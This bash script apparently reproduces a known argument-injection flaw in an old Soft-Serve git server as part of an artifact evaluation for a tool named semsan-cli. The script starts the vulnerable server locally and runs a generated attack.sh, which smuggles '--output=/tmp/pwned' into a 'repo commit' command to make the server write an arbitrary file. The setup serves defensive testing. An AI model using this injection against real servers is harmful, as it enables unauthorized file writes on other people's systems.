#!/usr/bin/env bash

set -euo pipefail

if [ ! -f "./semsan-cli" ]; then
  echo "Error: ./semsan-cli not found. Please build semsan-cli first as per the instructions in the README."
  exit 1
fi
cli="$(realpath ./semsan-cli)"

if [ ! -f "nix/packages/by-name/artifact-eval/micro-benchmark/config-general.yaml" ]; then
  echo "Error: This script must be run from the root of the repository."
  exit 1
fi

if [ ! -x /usr/local/bin/soft ]; then
  echo "Error: /usr/local/bin/soft not found. Install the vulnerable Soft-Serve with sudo ./aux/install-old-soft-serve.sh first."
  exit 1
fi

dir="$(mktemp -d)"
echo "Running reproduction in temporary directory: ${dir}"
cleanup() {
  rm -rf "${dir}"
}
trap cleanup EXIT

ssh_key="${dir}/id_ed25519"
ssh-keygen -q -t ed25519 -N "" -f "${ssh_key}"
ssh_opts="-i ${ssh_key} -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

attack="${dir}/attack.sh"
cat >"${attack}" <<EOF
#!/usr/bin/env bash
set -euo pipefail

for _ in {1..30}; do
  if ssh ${ssh_opts} -p 23231 localhost repo list >/dev/null 2>&1; then
    break
  fi
  sleep 1
done

ssh ${ssh_opts} -p 23231 localhost repo create icecream >/dev/null 2>&1 || true

work="${dir}/work"
mkdir -p "\${work}"
cd "\${work}"
git init -b main >/dev/null
git config user.name "SemSan"
git config user.email "semsan@example.invalid"
echo "hello" >README.md
git add README.md
git commit -m init >/dev/null
GIT_SSH_COMMAND="ssh ${ssh_opts}" git push ssh://localhost:23231/icecream main >/dev/null

rm -f /tmp/pwned
ssh ${ssh_opts} -p 23231 localhost repo commit icecream -- --output=/tmp/pwned || true
if [ -e /tmp/pwned ]; then
  echo "Soft-Serve PoC created /tmp/pwned"
fi
EOF
chmod +x "${attack}"

server="SOFT_SERVE_DATA_PATH=${dir}/data SOFT_SERVE_INITIAL_ADMIN_KEYS='$(cat "${ssh_key}.pub")' SOFT_SERVE_SSH_LISTEN_ADDR=127.0.0.1:23231 /usr/local/bin/soft serve"

sudo "$(command -v mprocs)" "${server}" "${attack}" "${cli} attach --config @CONFIG@"
